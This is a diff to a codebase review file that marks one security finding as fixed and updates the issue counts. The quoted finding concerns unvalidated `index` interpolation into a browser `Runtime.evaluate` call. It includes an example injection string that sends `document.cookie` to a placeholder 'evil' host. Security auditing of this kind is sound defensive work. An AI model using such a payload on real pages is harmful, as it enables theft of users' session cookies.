@@ -15,11 +15,11 @@ findings:
 verified: false
 status: issues_found
 dispositions:
-  fixed: 10
+  fixed: 11
   stale: 0
   skipped: 0
   deferred: 0
-  open: 97
+  open: 96
 ---
 
 # Codebase Review — moe
@@ -2637,6 +2637,10 @@ This is a maintenance/drift hazard rather than a live bug today: a future contri
 
 I confirmed both current call sites — `capture.js`'s `selectOptionWithCapture` and the `chrome-ws` CLI's `select` command — always pass the literal default (`index` is never threaded through from any caller-controlled value today), so this is not presently reachable with untrusted input. But `attachSelectOption({ getPageSession })` is a publicly exported module whose documented signature accepts an `index`, and the multi-element-warning feature it exists for (JRV-129) is exactly the kind of feature a future caller would wire a user-supplied index into. If that ever happens without an intermediate validation layer, a value like `0]; fetch('https://evil/'+document.cookie); ({x:[0` would execute arbitrary JS in the page's `Runtime.evaluate` context. Recommend validating `Number.isInteger(index)` up front and embedding via `JSON.stringify(index)` for consistency and defense-in-depth, the same way `selector`/`values` already are.
 
+**Disposition:** fixed
+**Commit:** `c2108d4e7e8e1d281b6475be892f953e67f06f1b`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-095: `type` action has no way to avoid the ~80-160ms-per-character `humanType` path
 
 **File:** `packages/glass/src/index.ts`
